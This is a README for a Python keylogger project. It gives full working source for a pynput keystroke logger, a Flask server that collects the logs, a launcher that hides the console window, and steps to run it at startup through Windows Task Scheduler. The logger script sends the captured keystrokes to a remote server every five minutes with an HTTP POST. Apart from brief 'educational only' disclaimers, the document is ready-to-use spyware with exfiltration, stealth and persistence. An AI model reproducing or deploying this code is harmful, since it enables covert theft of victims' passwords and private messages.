# Keylogger Project
<p align="center">
  <img src="https://github.com/user-attachments/assets/7aae0741-4d08-4b49-b36b-3a9eea08caaa" alt="What-is-a-keylogger-03">
</p>
This repository contains a simple keylogger implemented in Python using the `pynput` library. The keylogger captures keystrokes and sends them to a remote server using Flask. This project is intended for educational purposes only. Unauthorized use of keylogger software is illegal and unethical. Always obtain explicit consent before using any software that monitors or collects data.

Key Features:
- Captures keystrokes and logs them
- Sends log files to a remote Flask server
- Runs as a background task

Setup Instructions:
1. Install required Python packages
2. Set up the Flask server
3. Configure the keylogger script
4. Run the keylogger in a virtual environment using VMware

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [How It Works](#how-it-works)
- [Ethical and Legal Notice](#ethical-and-legal-notice)
- [Contributing](#contributing)
- [License](#license)

## Installation

### Prerequisites

- Python 3.x
- `pynput` library
- `requests` library
- VMware Workstation Pro (for virtual environment)
- Flask (for the server)

### Step-by-Step Guide

1. **Clone the Repository:**

    ```bash
    git clone https://github.com/yourusername/keylogger-project.git
    cd keylogger-project
    ```

2. **Install Python Packages:**

    ```bash
    pip install pynput requests flask
    ```

3. **Set Up the Flask Server:**

    Create a file named `server.py` and add the following code:

    ```python
    from flask import Flask, request
    import os

    app = Flask(__name__)
    upload_folder = "key_logs"
    if not os.path.exists(upload_folder):
        os.makedirs(upload_folder)

    @app.route('/upload', methods=['POST'])
    def upload_file():
        if 'file' not in request.files:
            return "No file part", 400
        file = request.files['file']
        if file.filename == '':
            return "No selected file", 400
        file.save(os.path.join(upload_folder, file.filename))
        return "File uploaded successfully", 200

    if __name__ == "__main__":
        app.run(host='0.0.0.0', port=5000)
    ```

    Run the Flask server:

    ```bash
    python server.py
    ```

4. **Configure the Keylogger:**

    Create a file named `keylogger.py` and add the following code:

    ```python
    from pynput import keyboard
    import logging
    import os
    import requests
    import threading
    import time

    log_dir = ""
    log_file = os.path.join(log_dir, "key_log.txt")

    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        try:
            logging.info(str(key))
        except AttributeError:
            logging.info('Special key {0} pressed'.format(key))

    def send_log_file():
        while True:
            if os.path.exists(log_file):
                with open(log_file, 'rb') as f:
                    requests.post("http://<server_ip>:5000/upload", files={'file': f})
            time.sleep(300)  # Send log file every 5 minutes

    if __name__ == "__main__":
        threading.Thread(target=send_log_file).start()
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    ```

    Replace `<server_ip>` with the IP address of your Flask server.

5. **Run the Keylogger in Background:**

    Create a file named `run_keylogger_in_background.py` and add the following code:

    ```python
    import subprocess

    def run_script_background(script_path):
        subprocess.Popen(["python", script_path], creationflags=subprocess.CREATE_NO_WINDOW)

    if __name__ == "__main__":
        script_to_run = "keylogger.py"  # Path to your keylogger script
        run_script_background(script_to_run)
    ```

6. **Create a Batch File:**

    Create a batch file named `run_keylogger.bat` and add the following code:

    ```batch
    @echo off
    python C:\path\to\run_keylogger_in_background.py
    ```

    Replace `C:\path\to` with the actual path to your script.

7. **Set Up Scheduled Task:**

    Use Windows Task Scheduler to create a scheduled task that runs the batch file at startup.

## Usage

1. Start the virtual machine in VMware.
2. Verify that the keylogger is running as a background task.
3. Check the Flask server's `key_logs` folder to see if log files are being received.

## How It Works

- **Keylogger Script:** Captures keystrokes and saves them to a log file.
- **Background Script:** Runs the keylogger in the background without showing a console window.
- **Batch File:** Executes the background script.
- **Flask Server:** Receives the log files from the keylogger and stores them.

## Ethical and Legal Notice

This project is intended for educational purposes only. Unauthorized use of keylogger software is illegal and unethical. Always obtain explicit consent before using any software that monitors or collects data.

## Contributing

Contributions are welcome! Please submit a pull request or open an issue to discuss your changes.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
